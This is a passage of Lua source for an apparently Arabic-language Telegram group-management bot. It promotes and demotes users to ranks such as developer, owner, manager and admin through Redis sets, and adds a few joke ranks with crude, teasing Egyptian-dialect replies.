return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• احسن برضوا دا عيل نجس 😂 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من اولادك بنجاح ").Reply,"md",true)  
end
end
if TextMsg == "غبي" then
if not Redis:sismember(LaRiCa.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• يارب تعقل وتبقا ذكي 😂   🙃 ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• خير اهو شغل مخك اهو نزلناك من الاغبياء🌚 ").Reply,"md",true)  
end
end
end


if text and text:match('^تنزيل (.*) (%d+)$') then
local UserId = {text:match('^تنزيل (.*) (%d+)$')}
local UserInfo = LuaTele.getUser(UserId[2])
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if UserId[1] == 'مطور ثانوي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Devss:Groups",UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Devss:Groups",UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله مطور ثانوي").Reply,"md",true)  
end
end
if UserId[1] == 'مطور' then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Dev:Groups",UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله مطور مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Dev:Groups",UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله مطور ").Reply,"md",true)  
end
end
if UserId[1] == "مالك" then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله مالك مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Owners:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله مالك ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله منشئ اساسي ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ" then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من المنشئين ").Reply,"md",true)  
end
end
if UserId[1] == "مدير" then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من المدراء ").Reply,"md",true)  
end
end
if UserId[1] == "ادمن" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من الادمنيه ").Reply,"md",true)  
end
end
if UserId[1] == "مميز" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id,UserId[2]) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id,UserId[2]) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"• تم تنزيله من المميزبن ").Reply,"md",true)  
end
end
end
if text and text:match('^رفع (.*) @(%S+)$') then
local UserName = {text:match('^رفع (.*) @(%S+)$')}
local UserId_Info = LuaTele.searchPublicChat(UserName[2])
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName[2]:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if UserName[1] == "مطور ثانوي" then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Devss:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Devss:Groups",UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مطور ثانوي").Reply,"md",true)  
end
end
if UserName[1] == "مطور" then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Dev:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مطور مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Dev:Groups",UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مطور ").Reply,"md",true)  
end
end
if UserName[1] == "مالك" then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مالك مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Owners:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مالك ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Supcreator:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته منشئ اساسي ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ" then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Creator:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته منشئ  ").Reply,"md",true)  
end
end
if UserName[1] == "مدير" then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مدير  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Manger:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مدير  ").Reply,"md",true)  
end
end
if UserName[1] == "ادمن" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:SetId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Admin:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته ادمن  ").Reply,"md",true)  
end
end
if UserName[1] == "مميز" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:SetId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مميز  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Special:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم ترقيته مميز  ").Reply,"md",true)  
end
end
---تسليه بالمعرف---
end
if text and text:match("^رفع (.*)$") and msg.reply_to_message_id ~= 0 then
local TextMsg = text:match("^رفع (.*)$")
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if TextMsg == 'مطور ثانوي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Devss:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Devss:Groups",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مطور ثانوي").Reply,"md",true)  
end
end
if TextMsg == 'مطور' then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مطور مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Dev:Groups",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مطور ").Reply,"md",true)  
end
end
if TextMsg == "مالك" then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مالك مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مالك ").Reply,"md",true)  
end
end
if TextMsg == "منشئ اساسي" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته منشئ اساسي ").Reply,"md",true)  
end
end
if TextMsg == "منشئ" then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته منشئ  ").Reply,"md",true)  
end
end
if TextMsg == "مدير" then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مدير  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مدير  ").Reply,"md",true)  
end
end
if TextMsg == "ادمن" then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:SetId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته ادمن  ").Reply,"md",true)  
end
end
if TextMsg == "مميز" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:SetId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مميز  مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته مميز  ").Reply,"md",true)  
end
end
---تسليه بالرد
if TextMsg == "فرخ" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• محطوط ف قايمة الفرخات من  بدري 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم ترقيته فرخ بالمجموعة لما يسترجل هننزلو 😂  ").Reply,"md",true)  
end
end
if TextMsg == "وتكه" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• دي اطلق بنوته هنا ف القايمة من بدري يباشه 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• جامدة وتستاهل بصراحة تترفع وتكه 😂  ").Reply,"md",true)  
end
end
if TextMsg == "متوحد" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• دا مولود كده ومحطوط عندنا من زمان 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم رفعه متوحد  كنت شاكك فيه انو سايكو😂  ").Reply,"md",true)  
end
end
if TextMsg == "متوحده" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
